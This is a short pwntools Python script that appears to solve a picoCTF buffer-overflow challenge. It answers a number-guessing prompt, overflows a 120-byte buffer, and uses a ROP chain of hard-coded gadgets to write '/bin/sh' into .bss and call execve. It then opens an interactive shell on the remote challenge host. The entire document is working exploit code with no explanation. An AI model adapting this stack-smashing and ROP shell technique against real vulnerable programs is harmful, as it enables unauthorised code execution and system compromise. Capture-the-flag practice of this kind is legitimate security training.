#!/usr/bin/python3

from pwn import *

local = False
filename = './vuln'
hostname = 'jupiter.challenges.picoctf.org'
port = 51462

# Gadgets
syscall = 0x40137c # syscall;
syscall_ret = 0x449e35 # syscall; ret; 
pop_rdi = 0x400696 # pop rdi; ret;
pop_rsi = 0x410ca3 # pop rsi; ret;
pop_rdx = 0x44cc26 # pop rdx; ret; 
pop_rax = 0x4163f4 # pop rax; ret;
mov_rdi_rdx = 0x436393 # mov qword ptr [rdi], rdx; ret;

offset = 120

bss_addr = 0x6bc3a0 # -rw- .bss

lucky_guess = '84\n'
bin_sh = 0x0068732f6e69622f # /bin/sh -> To Hex -> Swap endianness on CyberChef

payload = offset * b'A'
# Put /bin/sh into .bss

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(pop_rdx)
payload += p64(bin_sh)
payload += p64(mov_rdi_rdx)

# Call syscall 
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(pop_rsi)
payload += p64(0x0)
payload += p64(pop_rdx)
payload += p64(0x0)
payload += p64(syscall)

if local:
    p = process(filename)
    # break *win+75
    gdb.attach(p)
else:
    p = remote(hostname, port)

p.sendafter(b'What number would you like to guess?\n', lucky_guess.encode())
print('Sent lucky number')
p.recvuntil(b'Name? ')
print(f'Sending payload : {payload}')
p.sendline(payload)
p.interactive()
